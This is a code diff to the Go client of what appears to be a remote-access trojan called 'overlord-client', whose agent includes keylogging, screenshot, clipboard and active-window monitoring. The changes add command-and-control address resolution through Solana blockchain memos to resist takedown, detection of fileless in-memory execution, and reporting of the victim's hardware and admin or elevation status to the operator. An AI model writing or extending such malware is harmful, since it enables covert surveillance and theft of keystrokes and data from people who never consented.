@@ -11,6 +11,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"path/filepath"
 	"runtime"
 	"runtime/debug"
 	"strconv"
@@ -24,10 +25,30 @@ import (
 	"overlord-client/cmd/agent/keylogger"
 	"overlord-client/cmd/agent/plugins"
 	rt "overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/sysinfo"
 	"overlord-client/cmd/agent/wire"
 
 	"nhooyr.io/websocket"
 )
+
+func isRunningInMemory() bool {
+	exePath, err := os.Executable()
+	if err != nil {
+		return true
+	}
+	if realPath, err := filepath.EvalSymlinks(exePath); err == nil {
+		exePath = realPath
+	}
+	absPath, err := filepath.Abs(exePath)
+	if err != nil {
+		return true
+	}
+	info, err := os.Stat(absPath)
+	if err != nil || !info.Mode().IsRegular() {
+		return true
+	}
+	return false
+}
 
 func runClient(cfg config.Config) {
 	baseBackoff := computeBaseBackoff()
@@ -53,6 +74,10 @@ func runClient(cfg config.Config) {
 	consecutiveFailures := 0
 	// idek how tf to fix this. sometimes the client just says fuck you and downgrades then stops connections.
 	allowTLSDowngrade := false
+	var lastDisconnect time.Time
+	var lastSolRefresh time.Time
+	solInitialWait := 2 * time.Minute
+	solRefreshInterval := 2*time.Minute + time.Duration(rand.Intn(60))*time.Second
 
 	for {
 
@@ -76,9 +101,13 @@ func runClient(cfg config.Config) {
 		if err != nil {
 			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
 			consecutiveFailures++
+			if lastDisconnect.IsZero() {
+				lastDisconnect = time.Now()
+			}
 
-			if shouldRefreshRawList(cfg, consecutiveFailures) {
-				if refreshServerURLsFromRaw(&cfg) {
+			if shouldRefreshServerList(cfg, consecutiveFailures, lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
+				if refreshServerList(&cfg) {
+					lastSolRefresh = time.Now()
 					currentIndex = 0
 					consecutiveFailures = 0
 				}
@@ -102,6 +131,7 @@ func runClient(cfg config.Config) {
 
 		backoff = baseBackoff
 		consecutiveFailures = 0
+		lastDisconnect = time.Time{} // reset — we're connected
 		log.Printf("connected successfully to %s%s", currentServer, serverInfo)
 
 		conn.SetReadLimit(8 * 1024 * 1024)
@@ -116,9 +146,11 @@ func runClient(cfg config.Config) {
 				allowTLSDowngrade = false
 			}
 			log.Printf("session ended: %v (retrying in %s)", err, backoff)
+			lastDisconnect = time.Now()
 
-			if shouldRefreshRawList(cfg, len(cfg.ServerURLs)) {
-				if refreshServerURLsFromRaw(&cfg) {
+			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
+				if refreshServerList(&cfg) {
+					lastSolRefresh = time.Now()
 					currentIndex = 0
 					consecutiveFailures = 0
 				}
@@ -163,6 +195,18 @@ func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
 		return
 	}
 
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		log.Printf("No server URLs configured. Resolving from Solana memo (address: %s)", cfg.SolAddress)
+		for len(cfg.ServerURLs) == 0 {
+			if refreshServerURLsFromSolana(cfg) {
+				return
+			}
+			log.Printf("Retrying Solana memo lookup in %s", backoff)
+			time.Sleep(backoff)
+		}
+		return
+	}
+
 	if cfg.RawServerListURL == "" {
 		log.Printf("[config] WARNING: no server URLs configured; falling back to default %s", config.DefaultServerURL)
 		cfg.ServerURLs = []string{config.DefaultServerURL}
@@ -187,6 +231,47 @@ func shouldRefreshRawList(cfg config.Config, failures int) bool {
 		return true
 	}
 	return failures >= len(cfg.ServerURLs)
+}
+
+func shouldRefreshServerList(cfg config.Config, failures int, lastDisconnect, lastSolRefresh time.Time, solInitialWait, solRefreshInterval time.Duration) bool {
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		if lastDisconnect.IsZero() {
+			return false // still connected, never refresh
+		}
+		sinceDisconnect := time.Since(lastDisconnect)
+		if sinceDisconnect < solInitialWait {
+			return false // wait 2 min after disconnect before first check
+		}
+		if !lastSolRefresh.IsZero() && time.Since(lastSolRefresh) < solRefreshInterval {
+			return false // not yet time for next periodic check
+		}
+		return true
+	}
+	return shouldRefreshRawList(cfg, failures)
+}
+
+func refreshServerList(cfg *config.Config) bool {
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		return refreshServerURLsFromSolana(cfg)
+	}
+	return refreshServerURLsFromRaw(cfg)
+}
+
+func refreshServerURLsFromSolana(cfg *config.Config) bool {
+	urls, err := config.LoadServerURLsFromSolana(cfg.SolAddress, cfg.AgentToken, cfg.SolRPCEndpoints)
+	if err != nil {
+		log.Printf("[config] WARNING: failed to resolve server URLs from Solana: %v", err)
+		return false
+	}
+	if len(urls) == 0 {
+		log.Printf("[config] WARNING: Solana memo returned no valid URLs")
+		return false
+	}
+	if !equalStringSlices(cfg.ServerURLs, urls) {
+		log.Printf("[config] resolved server URLs from Solana memo (%d servers)", len(urls))
+		cfg.ServerURLs = urls
+	}
+	return true
 }
 
 func refreshServerURLsFromRaw(cfg *config.Config) bool {
@@ -368,23 +453,6 @@ func getEnrollmentRetryInterval() time.Duration {
 	return 30 * time.Second
 }
 
-func jitteredDelay(base time.Duration, jitterPct int) time.Duration {
-	if jitterPct <= 0 {
-		return base
-	}
-	if jitterPct > 50 {
-		jitterPct = 50
-	}
-	jitter := base * time.Duration(jitterPct) / 100
-	// random in [-jitter, +jitter]
-	offset := time.Duration(rand.Int63n(int64(jitter*2+1))) - jitter
-	result := base + offset
-	if result < time.Second {
-		result = time.Second
-	}
-	return result
-}
-
 func getPingInterval() time.Duration {
 	raw := strings.TrimSpace(os.Getenv("OVERLORD_PING_INTERVAL_MS"))
 	if raw == "" {
@@ -401,6 +469,38 @@ func getPingInterval() time.Duration {
 	return time.Duration(ms) * time.Millisecond
 }
 
+func classifySessionError(err error) (reason, detail string) {
+	if err == nil {
+		return "crash", ""
+	}
+	msg := err.Error()
+	msgLower := strings.ToLower(msg)
+	if strings.Contains(msgLower, "panic") {
+		return "panic", truncateStr(msg, 300)
+	}
+	var closeErr *websocket.CloseError
+	if errors.As(err, &closeErr) {
+		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
+			return "normal", ""
+		}
+		return "network", fmt.Sprintf("ws close code=%d reason=%s", closeErr.Code, truncateStr(closeErr.Reason, 100))
+	}
+	if strings.Contains(msgLower, "timed out from inactivity") || strings.Contains(msgLower, "pong timeout") {
+		return "timeout", truncateStr(msg, 300)
+	}
+	if strings.Contains(msgLower, "context canceled") || strings.Contains(msgLower, "context deadline exceeded") {
+		return "normal", ""
+	}
+	return "network", truncateStr(msg, 300)
+}
+
+func truncateStr(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + "…"
+}
+
 func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -412,7 +512,14 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		}
 	}()
 	defer cancel()
-	defer conn.Close(websocket.StatusNormalClosure, "bye")
+	defer func() {
+		reason, detail := classifySessionError(err)
+		di := wire.DisconnectInfo{Type: "disconnect_info", Reason: reason, Detail: detail}
+		sendCtx, sendCancel := context.WithTimeout(context.Background(), 2*time.Second)
+		defer sendCancel()
+		_ = wire.WriteMsg(sendCtx, conn, di)
+		conn.Close(websocket.StatusNormalClosure, "bye")
+	}()
 
 	identity := config.DeriveIdentity()
 	log.Printf("[purgatory] identity fingerprint=%s", identity.Fingerprint)
@@ -498,7 +605,15 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		BuildTag:    cfg.BuildTag,
 		PublicKey:   publicKeyB64,
 		Signature:   signatureB64,
+		InMemory:    isRunningInMemory(),
 	}
+
+	hw := sysinfo.Collect()
+	hello.CPU = hw.CPU
+	hello.GPU = hw.GPU
+	hello.RAM = hw.RAM
+	hello.IsAdmin = sysinfo.IsAdmin()
+	hello.Elevation = sysinfo.Elevation()
 
 	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
 		return fmt.Errorf("send hello: %w", err)
@@ -546,15 +661,15 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 	}
 
 	if interval := getPingInterval(); interval > 0 {
-		jitterPct := cfg.JitterPercent
-		log.Printf("ping: heartbeat interval=%s jitter=%d%%", interval, jitterPct)
+		log.Printf("ping: heartbeat interval=%s", interval)
 		goSafe("ping loop", cancel, func() {
+			ticker := time.NewTicker(interval)
+			defer ticker.Stop()
 			for {
-				delay := jitteredDelay(interval, jitterPct)
 				select {
 				case <-ctx.Done():
 					return
-				case <-time.After(delay):
+				case <-ticker.C:
 					ping := wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}
 					if err := wire.WriteMsg(ctx, env.Conn, ping); err != nil {
 						log.Printf("ping: failed to send: %v", err)
@@ -579,6 +694,7 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 					last := env.LastPong()
 					if !last.IsZero() && time.Since(last) > grace {
 						log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
+						conn.Close(websocket.StatusGoingAway, "pong timeout")
 						cancel()
 						return
 					}
@@ -604,14 +720,16 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 			}
 		}()
 
-		if err := readLoop(ctx, conn, env, dispatcher); err != nil {
-			log.Printf("readLoop ended: %v", err)
-			select {
-			case readErr <- err:
-			default:
-			}
-			cancel()
+		err := readLoop(ctx, conn, env, dispatcher)
+		if err == nil {
+			err = fmt.Errorf("readLoop exited unexpectedly")
 		}
+		log.Printf("readLoop ended: %v", err)
+		select {
+		case readErr <- err:
+		default:
+		}
+		cancel()
 	}()
 
 	shotCtx, cancelShots := context.WithCancel(ctx)
@@ -620,13 +738,13 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 		capture.Loop(shotCtx, env)
 	})
 
-	goSafe("activewindow", nil, func() {
+	goSafe("activewindow", cancel, func() {
 		if err := activewindow.Start(ctx, env); err != nil {
 			log.Printf("activewindow error: %v", err)
 		}
 	})
 
-	goSafe("clipboard", nil, func() {
+	goSafe("clipboard", cancel, func() {
 		if err := activewindow.StartClipboard(ctx, env); err != nil {
 			log.Printf("clipboard error: %v", err)
 		}
